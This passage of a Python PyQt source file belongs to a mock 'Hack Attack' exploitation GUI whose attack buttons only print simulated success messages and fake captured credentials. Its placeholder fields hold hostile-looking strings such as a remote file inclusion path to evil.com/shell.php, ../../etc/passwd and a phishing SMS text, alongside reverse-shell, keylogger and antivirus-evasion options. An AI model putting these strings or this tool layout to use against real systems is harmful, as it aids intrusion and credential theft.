        if "Buffer Overflow" in exploit_name:
            self.binary_results.append("[*] EIP control achieved at offset 40")
            self.binary_results.append("[*] JMP ESP found at 0xdeadbeef")
            self.binary_results.append("[*] Exploit sent successfully!")
        elif "ROP" in exploit_name:
            self.binary_results.append("[*] ROP chain generated with 12 gadgets")
            self.binary_results.append("[*] Bypassed DEP and ASLR")
            self.binary_results.append("[*] Exploit sent successfully!")
        else:
            self.binary_results.append("[*] Exploit executed successfully!")
    
    def start_social_attack(self):
        """Start the selected social engineering attack"""
        current_item = self.social_attack_list.currentItem()
        if not current_item:
            self.show_message("Please select an attack first", "error")
            return
            
        attack_name = current_item.text()
        self.social_results.append(f"[+] Starting {attack_name} attack...")
        self.social_results.append("[*] This is a simulated attack - no actual emails or messages are sent in this demo")
        self.social_start_btn.setEnabled(False)
        self.social_stop_btn.setEnabled(True)
        
        # Simulate some progress
        self.social_results.append("[*] Setting up attack infrastructure...")
        self.social_results.append("[*] Preparing payload...")
        self.social_results.append("[*] Sending attack...")
        self.social_results.append("[+] Attack sent successfully!")
        
        # Simulate capturing credentials (for demonstration)
        if "Credential" in attack_name:
            self.add_credential("admin@example.com", "P@ssw0rd123!")
            self.social_results.append("[+] Captured credentials!")
    
    def stop_social_attack(self):
        """Stop the running social engineering attack"""
        self.social_start_btn.setEnabled(True)
        self.social_stop_btn.setEnabled(False)
        self.social_results.append("[*] Attack stopped by user")
    
    def add_credential(self, username, password):
        """Add captured credentials to the log"""
        row = self.credential_log.rowCount()
        self.credential_log.insertRow(row)
        self.credential_log.setItem(row, 0, QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        self.credential_log.setItem(row, 1, QTableWidgetItem(username))
        self.credential_log.setItem(row, 2, QTableWidgetItem(password))
        self.credential_log.scrollToBottom()
    
    def start_wireless_scan(self):
        """Start scanning for wireless networks"""
        interface = self.wireless_interfaces.currentText()
        if not interface:
            self.show_message("Please select a wireless interface", "error")
            return
            
        self.wireless_results.append(f"[+] Starting scan on interface {interface}...")
        self.wireless_results.append("[*] This is a simulated scan - no actual scanning occurs in this demo")
        
        # Simulate finding networks
        self.wireless_results.append("[*] Found 5 networks:")
        self.wireless_results.append("    BSSID              ESSID           CH  ENC")
        self.wireless_results.append("    00:11:22:33:44:00  HomeWiFi        6   WPA2")
        self.wireless_results.append("    00:11:22:33:44:01  OfficeNetwork   1   WPA2")
        self.wireless_results.append("    00:11:22:33:44:02  CoffeeShopWiFi  11  WPA")
        self.wireless_results.append("    00:11:22:33:44:03  FreeWiFi        3   OPEN")
        self.wireless_results.append("    00:11:22:33:44:04  GuestNet        9   WPA2")
        
        # Enable attack button
        self.wireless_attack_btn.setEnabled(True)
    
    def start_wireless_attack(self):
        """Start the selected wireless attack"""
        current_item = self.wireless_attack_list.currentItem()
        if not current_item:
            self.show_message("Please select an attack first", "error")
            return
            
        attack_name = current_item.text()
        interface = self.wireless_interfaces.currentText()
        
        self.wireless_results.append(f"[+] Starting {attack_name} on interface {interface}...")
        self.wireless_results.append("[*] This is a simulated attack - no actual wireless attacks occur in this demo")
        
        # Disable scan/attack buttons, enable stop button
        self.wireless_scan_btn.setEnabled(False)
        self.wireless_attack_btn.setEnabled(False)
        self.wireless_stop_btn.setEnabled(True)
        
        # Simulate attack progress
        self.wireless_results.append("[*] Setting up attack...")
        self.wireless_results.append("[*] Attack in progress...")
        
        # Simulate packet capture
        self.packet_view.setPlainText(
            "12:34:56.789 Beacon (HomeWiFi) [00:11:22:33:44:00]\n"
            "12:34:57.123 Probe Request [AA:BB:CC:DD:EE:FF]\n"
            "12:34:57.456 Probe Response (HomeWiFi) [00:11:22:33:44:00]\n"
            "12:34:58.789 Authentication [AA:BB:CC:DD:EE:FF] -> [00:11:22:33:44:00]\n"
            "12:34:59.123 Association Request [AA:BB:CC:DD:EE:FF] -> [00:11:22:33:44:00]\n"
            "12:34:59.456 Association Response [00:11:22:33:44:00] -> [AA:BB:CC:DD:EE:FF]\n"
            "12:35:00.000 EAPOL 1/4 [00:11:22:33:44:00] -> [AA:BB:CC:DD:EE:FF]\n"
            "12:35:00.250 EAPOL 2/4 [AA:BB:CC:DD:EE:FF] -> [00:11:22:33:44:00]\n"
            "12:35:00.500 EAPOL 3/4 [00:11:22:33:44:00] -> [AA:BB:CC:DD:EE:FF]\n"
            "12:35:00.750 EAPOL 4/4 [AA:BB:CC:DD:EE:FF] -> [00:11:22:33:44:00]\n"
        )
        
        # Add a client to the table (for demonstration)
        self.client_table.setRowCount(1)
        self.client_table.setItem(0, 0, QTableWidgetItem("AA:BB:CC:DD:EE:FF"))
        self.client_table.setItem(0, 1, QTableWidgetItem("Apple, Inc."))
        self.client_table.setItem(0, 2, QTableWidgetItem("-45 dBm"))
        self.client_table.setItem(0, 3, QTableWidgetItem("24"))
        self.client_table.setItem(0, 4, QTableWidgetItem(datetime.now().strftime("%H:%M:%S")))
    
    def stop_wireless_attack(self):
        """Stop the running wireless attack"""
        self.wireless_scan_btn.setEnabled(True)
        self.wireless_attack_btn.setEnabled(True)
        self.wireless_stop_btn.setEnabled(False)
        self.wireless_results.append("[*] Attack stopped by user")
    
    def execute_post_module(self):
        """Execute the selected post-exploitation module"""
        current_item = self.post_modules.currentItem()
        if not current_item:
            self.show_message("Please select a module first", "error")
            return
            
        module_name = current_item.text()
        target = self.post_target.text().strip()
        
        if not target:
            self.show_message("Please enter a target IP or hostname", "error")
            return
            
        self.post_output.append(f"[+] Executing {module_name} on {target}...")
        self.post_output.append("[*] This is a simulated module - no actual post-exploitation occurs in this demo")
        
        # Disable execute button, enable stop button
        self.post_execute_btn.setEnabled(False)
        self.post_stop_btn.setEnabled(True)
        
        # Simulate module execution
        self.post_output.append("[*] Connecting to target...")
        self.post_output.append("[*] Authenticating...")
        self.post_output.append("[*] Running module...")
        
        # Simulate module-specific output
        if module_name == "Privilege Escalation":
            self.post_output.append("[*] Checking for kernel exploits...")
            self.post_output.append("[*] Checking for SUID binaries...")
            self.post_output.append("[*] Checking for sudo misconfigurations...")
            self.post_output.append("[+] Found vulnerable sudo configuration: ALL=(ALL) NOPASSWD: /usr/bin/find")
            self.post_output.append("[+] Exploiting sudo misconfiguration...")
            self.post_output.append("[+] Privileges elevated successfully!")
        elif module_name == "Credential Harvesting":
            self.post_output.append("[*] Searching for credential files...")
            self.post_output.append("[*] Checking browser data...")
            self.post_output.append("[+] Found credentials in browser data")
            
            # Add some credentials to the table
            self.post_creds_table.insertRow(0)
            self.post_creds_table.setItem(0, 0, QTableWidgetItem("admin"))
            self.post_creds_table.setItem(0, 1, QTableWidgetItem("admin123"))
            self.post_creds_table.setItem(0, 2, QTableWidgetItem("Browser Data"))
            self.post_creds_table.setItem(0, 3, QTableWidgetItem("Chrome"))
            
            self.post_creds_table.insertRow(1)
            self.post_creds_table.setItem(1, 0, QTableWidgetItem("root"))
            self.post_creds_table.setItem(1, 1, QTableWidgetItem("toor"))
            self.post_creds_table.setItem(1, 2, QTableWidgetItem("SSH Config"))
            self.post_creds_table.setItem(1, 3, QTableWidgetItem(""))
        
        self.post_output.append("[+] Module executed successfully!")
        
        # Re-enable execute button, disable stop button
        self.post_execute_btn.setEnabled(True)
        self.post_stop_btn.setEnabled(False)
    
    def stop_post_module(self):
        """Stop the running post-exploitation module"""
        self.post_execute_btn.setEnabled(True)
        self.post_stop_btn.setEnabled(False)
        self.post_output.append("[*] Module execution stopped by user")
    
    # ===== UI OPTIONS METHODS =====
    def add_sql_options(self):
        """Add SQL Injection specific options"""
        self.technique = QComboBox()
        self.technique.addItems(["Boolean-based", "Time-based", "Error-based", "UNION"])
        
        self.db_type = QComboBox()
        self.db_type.addItems(["Auto-detect", "MySQL", "PostgreSQL", "Oracle", "SQL Server", "SQLite"])
        
        self.options_layout.addRow("Technique:", self.technique)
        self.options_layout.addRow("Database:", self.db_type)
    
    def add_xss_options(self):
        """Add XSS specific options"""
        self.xss_type = QComboBox()
        self.xss_type.addItems(["Reflected", "Stored", "DOM-based"])
        
        self.xss_context = QComboBox()
        self.xss_context.addItems(["HTML", "Attribute", "JavaScript", "URL"])
        
        self.options_layout.addRow("XSS Type:", self.xss_type)
        self.options_layout.addRow("Context:", self.xss_context)
    
    def add_command_injection_options(self):
        """Add Command Injection specific options"""
        self.os_type = QComboBox()
        self.os_type.addItems(["Unix/Linux", "Windows"])
        
        self.injection_type = QComboBox()
        self.injection_type.addItems(["Semicolon (;)", "Ampersand (&)", "Pipe (|)", "Backtick (`)", "Dollar (${})"])
        
        self.options_layout.addRow("Target OS:", self.os_type)
        self.options_layout.addRow("Injection Type:", self.injection_type)
    
    def add_file_inclusion_options(self):
        """Add File Inclusion specific options"""
        self.inclusion_type = QComboBox()
        self.inclusion_type.addItems(["Local File Inclusion (LFI)", "Remote File Inclusion (RFI)"])
        
        self.file_path = QLineEdit()
        self.file_path.setPlaceholderText("e.g., ../../etc/passwd or http://evil.com/shell.php")
        
        self.options_layout.addRow("Inclusion Type:", self.inclusion_type)
        self.options_layout.addRow("File Path:", self.file_path)
    
    def add_ssrf_options(self):
        """Add SSRF specific options"""
        self.ssrf_url = QLineEdit()
        self.ssrf_url.setPlaceholderText("http://internal-service.local")
        
        self.ssrf_method = QComboBox()
        self.ssrf_method.addItems(["GET", "POST", "PUT", "DELETE"])
        
        self.options_layout.addRow("Target URL:", self.ssrf_url)
        self.options_layout.addRow("HTTP Method:", self.ssrf_method)
    
    def add_xxe_options(self):
        """Add XXE specific options"""
        self.xxe_type = QComboBox()
        self.xxe_type.addItems(["External Entity", "Local File Disclosure", "Server-Side Request Forgery"])
        
        self.xxe_payload = QTextEdit()
        self.xxe_payload.setPlaceholderText("Paste your XXE payload here")
        self.xxe_payload.setMaximumHeight(100)
        
        self.options_layout.addRow("XXE Type:", self.xxe_type)
        self.options_layout.addRow("Payload:", self.xxe_payload)
    
    def add_deserialization_options(self):
        """Add Deserialization specific options"""
        self.serialization_format = QComboBox()
        self.serialization_format.addItems(["Pickle (Python)", "Java Serialized", ".NET Serialized", "PHP Serialized"])
        
        self.gadget_chain = QComboBox()
        self.gadget_chain.addItems(["Auto-detect", "CommonsCollections", "ROME", "JBoss", "Spring"])
        
        self.options_layout.addRow("Format:", self.serialization_format)
        self.options_layout.addRow("Gadget Chain:", self.gadget_chain)
    
    def add_port_scanner_options(self):
        """Add port scanner specific options"""
        self.scan_type = QComboBox()
        self.scan_type.addItems(["TCP Connect", "SYN Stealth", "UDP", "Comprehensive"])
        
        self.scan_speed = QComboBox()
        self.scan_speed.addItems(["T0 (Paranoid)", "T1 (Sneaky)", "T2 (Polite)", 
                                "T3 (Normal)", "T4 (Aggressive)", "T5 (Insane)"])
        
        self.network_options_layout.addRow("Scan Type:", self.scan_type)
        self.network_options_layout.addRow("Timing Template:", self.scan_speed)
    
    def add_fingerprinting_options(self):
        """Add service fingerprinting options"""
        self.fp_intensity = QComboBox()
        self.fp_intensity.addItems(["Light", "Normal", "Aggressive", "Full"])
        
        self.fp_os_detection = QCheckBox("Enable OS detection")
        self.fp_os_detection.setChecked(True)
        
        self.fp_services = QLineEdit()
        self.fp_services.setPlaceholderText("http,https,ssh,ftp,smb")
        
        self.network_options_layout.addRow("Intensity:", self.fp_intensity)
        self.network_options_layout.addRow("OS Detection:", self.fp_os_detection)
        self.network_options_layout.addRow("Services:", self.fp_services)
    
    def add_mitm_options(self):
        """Add MITM options"""
        self.mitm_target = QLineEdit()
        self.mitm_target.setPlaceholderText("Target IP or range")
        
        self.mitm_gateway = QLineEdit()
        self.mitm_gateway.setPlaceholderText("Gateway IP (optional)")
        
        self.network_options_layout.addRow("Target IP/Range:", self.mitm_target)
        self.network_options_layout.addRow("Gateway IP:", self.mitm_gateway)
    
    def add_arp_spoofing_options(self):
        """Add ARP spoofing options"""
        self.arp_target = QLineEdit()
        self.arp_target.setPlaceholderText("Target IP")
        
        self.arp_gateway = QLineEdit()
        self.arp_gateway.setPlaceholderText("Gateway IP")
        
        self.network_options_layout.addRow("Target IP:", self.arp_target)
        self.network_options_layout.addRow("Gateway IP:", self.arp_gateway)
    
    def add_dns_spoofing_options(self):
        """Add DNS spoofing options"""
        self.dns_domain = QLineEdit()
        self.dns_domain.setPlaceholderText("example.com")
        
        self.dns_ip = QLineEdit()
        self.dns_ip.setPlaceholderText("Attacker IP")
        
        self.network_options_layout.addRow("Domain:", self.dns_domain)
        self.network_options_layout.addRow("Redirect to IP:", self.dns_ip)
    
    def add_smb_options(self):
        """Add SMB exploit options"""
        self.smb_share = QLineEdit()
        self.smb_share.setPlaceholderText("C$")
        
        self.smb_exploit = QComboBox()
        self.smb_exploit.addItems(["MS17-010 (EternalBlue)", "MS08-067", "MS10-061"])
        
        self.network_options_layout.addRow("Share:", self.smb_share)
        self.network_options_layout.addRow("Exploit:", self.smb_exploit)
    
    def add_rdp_options(self):
        """Add RDP exploit options"""
        self.rdp_username = QLineEdit()
        self.rdp_username.setPlaceholderText("Administrator")
        
        self.rdp_password = QLineEdit()
        self.rdp_password.setPlaceholderText("password")
        if hasattr(QLineEdit, 'EchoMode'):  # PyQt6
            self.rdp_password.setEchoMode(QLineEdit.EchoMode.Password)
        else:  # PyQt5
            self.rdp_password.setEchoMode(QLineEdit.Password)
        
        self.rdp_exploit = QComboBox()
        self.rdp_exploit.addItems(["BlueKeep (CVE-2019-0708)", "DejaBlue (CVE-2019-1181/1182)"])
        
        self.network_options_layout.addRow("Username:", self.rdp_username)
        self.network_options_layout.addRow("Password:", self.rdp_password)
        self.network_options_layout.addRow("Exploit:", self.rdp_exploit)
    
    def add_buffer_overflow_options(self):
        """Add buffer overflow options"""
        self.bo_type = QComboBox()
        self.bo_type.addItems(["Stack-based", "Heap-based", "SEH", "Egg Hunter"])
        
        self.bo_arch = QComboBox()
        self.bo_arch.addItems(["x86", "x86-64", "ARM", "ARM64"])
        
        self.bo_badchars = QLineEdit()
        self.bo_badchars.setPlaceholderText("\\x00\\x0a\\x0d")
        
        self.bo_padding = QSpinBox()
        self.bo_padding.setRange(0, 10000)
        self.bo_padding.setValue(100)
        
        self.binary_options_layout.addRow("Type:", self.bo_type)
        self.binary_options_layout.addRow("Architecture:", self.bo_arch)
        self.binary_options_layout.addRow("Bad Characters:", self.bo_badchars)
        self.binary_options_layout.addRow("Padding:", self.bo_padding)
    
    def add_format_string_options(self):
        """Add format string exploit options"""
        self.fs_offset = QSpinBox()
        self.fs_offset.setRange(1, 100)
        self.fs_offset.setValue(10)
        
        self.fs_write_addr = QLineEdit()
        self.fs_write_addr.setPlaceholderText("0xdeadbeef")
        
        self.fs_write_value = QLineEdit()
        self.fs_write_value.setPlaceholderText("0xcafebabe")
        
        self.binary_options_layout.addRow("Offset:", self.fs_offset)
        self.binary_options_layout.addRow("Write Address:", self.fs_write_addr)
        self.binary_options_layout.addRow("Write Value:", self.fs_write_value)
    
    def add_rop_options(self):
        """Add ROP chain options"""
        self.rop_arch = QComboBox()
        self.rop_arch.addItems(["x86", "x86-64", "ARM", "ARM64"])
        
        self.rop_technique = QComboBox()
        self.rop_technique.addItems(["Ret2libc", "ROPgadget", "mona rop"]) 
        
        self.rop_chain = QTextEdit()
        self.rop_chain.setPlaceholderText("ROP chain will be generated here...")
        
        self.binary_options_layout.addRow("Architecture:", self.rop_arch)
        self.binary_options_layout.addRow("Technique:", self.rop_technique)
        self.binary_options_layout.addRow("ROP Chain:", self.rop_chain)
    
    def add_shellcode_options(self):
        """Add shellcode generation options"""
        self.sc_type = QComboBox()
        self.sc_type.addItems(["Reverse Shell", "Bind Shell", "Meterpreter", "Custom"])
        
        self.sc_lhost = QLineEdit()
        self.sc_lhost.setPlaceholderText("Attacker IP")
        
        self.sc_lport = QLineEdit()
        self.sc_lport.setPlaceholderText("4444")
        
        self.sc_badchars = QLineEdit()
        self.sc_badchars.setPlaceholderText("\\x00\\x0a\\x0d")
        
        self.binary_options_layout.addRow("Type:", self.sc_type)
        self.binary_options_layout.addRow("LHOST:", self.sc_lhost)
        self.binary_options_layout.addRow("LPORT:", self.sc_lport)
        self.binary_options_layout.addRow("Bad Characters:", self.sc_badchars)
    
    def add_aslr_options(self):
        """Add ASLR bypass options"""
        self.aslr_technique = QComboBox()
        self.aslr_technique.addItems(["Bruteforce", "Memory Leak", "Partial Overwrite"])
        
        self.aslr_leak_addr = QLineEdit()
        self.aslr_leak_addr.setPlaceholderText("0xdeadbeef")
        
        self.binary_options_layout.addRow("Technique:", self.aslr_technique)
        self.binary_options_layout.addRow("Leak Address:", self.aslr_leak_addr)
    
    def add_dep_options(self):
        """Add DEP/ASLR bypass options"""
        self.dep_technique = QComboBox()
        self.dep_technique.addItems(["ROP", "Ret2Libc", "JIT Spraying"])
        
        self.dep_gadgets = QTextEdit()
        self.dep_gadgets.setPlaceholderText("Gadgets will be listed here...")
        
        self.binary_options_layout.addRow("Bypass Technique:", self.dep_technique)
        self.binary_options_layout.addRow("Available Gadgets:", self.dep_gadgets)
    
    def add_uaf_options(self):
        """Add Use-After-Free options"""
        self.uaf_technique = QComboBox()
        self.uaf_technique.addItems(["Heap Spray", "Grooming", "Type Confusion"])
        
        self.uaf_allocation_size = QSpinBox()
        self.uaf_allocation_size.setRange(1, 1000000)
        self.uaf_allocation_size.setValue(1024)
        
        self.binary_options_layout.addRow("Technique:", self.uaf_technique)
        self.binary_options_layout.addRow("Allocation Size:", self.uaf_allocation_size)
    
    def add_heap_options(self):
        """Add heap exploitation options"""
        self.heap_technique = QComboBox()
        self.heap_technique.addItems(["Fastbin Dup", "Unlink", "House of Force"])
        
        self.heap_chunk_size = QSpinBox()
        self.heap_chunk_size.setRange(1, 1000000)
        self.heap_chunk_size.setValue(128)
        
        self.binary_options_layout.addRow("Technique:", self.heap_technique)
        self.binary_options_layout.addRow("Chunk Size:", self.heap_chunk_size)
    
    def add_integer_overflow_options(self):
        """Add integer overflow options"""
        self.io_type = QComboBox()
        self.io_type.addItems(["Signed/Unsigned Mismatch", "Arithmetic Overflow", "Type Confusion"])
        
        self.io_variable = QLineEdit()
        self.io_variable.setPlaceholderText("Variable name or offset")
        
        self.binary_options_layout.addRow("Type:", self.io_type)
        self.binary_options_layout.addRow("Target Variable:", self.io_variable)
    
    def add_race_condition_options(self):
        """Add race condition options"""
        self.rc_technique = QComboBox()
        self.rc_technique.addItems(["TOCTOU", "Symlink Race", "Signal Race"])
        
        self.rc_threads = QSpinBox()
        self.rc_threads.setRange(1, 1000)
        self.rc_threads.setValue(10)
        
        self.binary_options_layout.addRow("Technique:", self.rc_technique)
        self.binary_options_layout.addRow("Threads:", self.rc_threads)
    
    def add_phishing_options(self):
        """Add phishing attack options"""
        form = QFormLayout()
        
        self.phish_attack = QComboBox()
        self.phish_attack.addItems(["Email", "Website", "Social Media"])
        
        self.phish_payload = QComboBox()
        self.phish_payload.addItems(["Credential Theft", "Malware Delivery", "Information Gathering"])
        
        self.phish_template = QComboBox()
        self.phish_template.addItems(["Password Reset", "Account Verification", "Document Share", "Invoice"])
        
        form.addRow("Method:", self.phish_attack)
        form.addRow("Payload Type:", self.phish_payload)
        form.addRow("Template:", self.phish_template)
        
        self.social_options_layout.addLayout(form)
    
    def add_credential_harvesting_options(self):
        """Add credential harvesting options"""
        form = QFormLayout()
    
        self.cred_landing_page = QComboBox()
        self.cred_landing_page.addItems(["Office 365", "Gmail", "Facebook", "LinkedIn", "Custom"])
        
        self.cred_custom_url = QLineEdit()
        self.cred_custom_url.setPlaceholderText("https://your-server.com/login")
        self.cred_custom_url.setEnabled(False)
        
        self.cred_landing_page.currentTextChanged.connect(lambda t: self.cred_custom_url.setEnabled(t == "Custom"))
        
        form.addRow("Target Service:", self.cred_landing_page)
        form.addRow("Custom URL:", self.cred_custom_url)
        
        self.social_options_layout.addLayout(form)
    
    def add_malicious_usb_options(self):
        """Add malicious USB options"""
        form = QFormLayout()
        
        self.usb_payload = QComboBox()
        self.usb_payload.addItems(["Reverse Shell", "Keylogger", "Data Exfiltration"])
        
        self.usb_autorun = QCheckBox("Enable Autorun")
        self.usb_autorun.setChecked(True)
        
        self.usb_obfuscate = QCheckBox("Obfuscate Payload")
        self.usb_obfuscate.setChecked(True)
        
        form.addRow("Payload:", self.usb_payload)
        form.addRow("Autorun:", self.usb_autorun)
        form.addRow("Obfuscation:", self.usb_obfuscate)
        
        self.social_options_layout.addLayout(form)
    
    def add_qr_attack_options(self):
        """Add QR code attack options"""
        form = QFormLayout()
        
        self.qr_payload = QComboBox()
        self.qr_payload.addItems(["WiFi Credentials", "Malicious URL", "Contact Card"])
        
        self.qr_url = QLineEdit()
        self.qr_url.setPlaceholderText("https://evil.com/")
        
        form.addRow("Payload Type:", self.qr_payload)
        form.addRow("URL:", self.qr_url)
        
        self.social_options_layout.addLayout(form)
    
    def add_call_spoofing_options(self):
        """Add call spoofing options"""
        form = QFormLayout()
        
        self.call_spoof_number = QLineEdit()
        self.call_spoof_number.setPlaceholderText("+1234567890")
        
        self.call_script = QComboBox()
        self.call_script.addItems(["Bank Verification", "Tech Support", "HR Department"])
        
        form.addRow("Spoofed Number:", self.call_spoof_number)
        form.addRow("Script:", self.call_script)
        
        self.social_options_layout.addLayout(form)
    
    def add_sms_phishing_options(self):
        """Add SMS phishing options"""
        form = QFormLayout()
        
        self.sms_sender = QLineEdit()
        self.sms_sender.setPlaceholderText("Bank")
        
        self.sms_message = QTextEdit()
        self.sms_message.setMaximumHeight(100)
        self.sms_message.setPlaceholderText("Your account has been locked. Click here to unlock: [LINK]")
        
        form.addRow("Sender ID:", self.sms_sender)
        form.addRow("Message:", self.sms_message)
        
        self.social_options_layout.addLayout(form)
    
    def add_social_media_options(self):
        """Add social media impersonation options"""
        form = QFormLayout()
        
        self.sm_platform = QComboBox()
        self.sm_platform.addItems(["LinkedIn", "Facebook", "Twitter", "Instagram"])
        
        self.sm_message = QTextEdit()
        self.sm_message.setMaximumHeight(100)
        self.sm_message.setPlaceholderText("Hi [Name], I noticed your profile and thought we should connect!")
        
        form.addRow("Platform:", self.sm_platform)
        form.addRow("Message:", self.sm_message)
        
        self.social_options_layout.addLayout(form)
    
    def add_physical_access_options(self):
        """Add physical access attack options"""
        form = QFormLayout()
        
        self.phy_attack = QComboBox()
        self.phy_attack.addItems(["BadUSB", "LAN Tap", "Keylogger", "USB Drop"])
        
        self.phy_payload = QComboBox()
        self.phy_payload.addItems(["Reverse Shell", "Data Exfiltration", "Persistence"])
        
        self.phy_evade_av = QCheckBox("Evade Antivirus")
        self.phy_evade_av.setChecked(True)
        
        form.addRow("Attack Type:", self.phy_attack)
        form.addRow("Payload:", self.phy_payload)
        form.addRow("Evasion:", self.phy_evade_av)
        
        self.social_options_layout.addLayout(form)

def get_module():
    """
    Return an instance of the module.
    This function is used by the module loader to create an instance of the module.
    """
    return ExploitationModule()

def main():
    """
    Main function to run the Exploitation & Payloads module as a standalone application
    """
    if not PYQT6_AVAILABLE and not PYQT5_AVAILABLE:
        print("Error: PyQt6 or PyQt5 is required to run this application.")
        return 1
    
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    # Create main window
    window = QMainWindow()
    window.setWindowTitle("Hack Attack - Exploitation & Payloads")
    window.setMinimumSize(1200, 800)
    
    # Create and set central widget
    widget = ExploitationGUI(parent=window)  # Pass the window as parent
    window.setCentralWidget(widget)
    
    # Show the window and center it on screen
    window.show()
    
    # Center the window on screen
    screen = QApplication.primaryScreen().geometry()
    size = window.geometry()
    window.move(
        (screen.width() - size.width()) // 2,
        (screen.height() - size.height()) // 2
    )
    
    # Start the application event loop
    sys.exit(app.exec() if PYQT6_AVAILABLE else app.exec_())


# This ensures the script runs when executed directly
if __name__ == "__main__":
    import sys
    try:
        main()
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        sys.exit(1)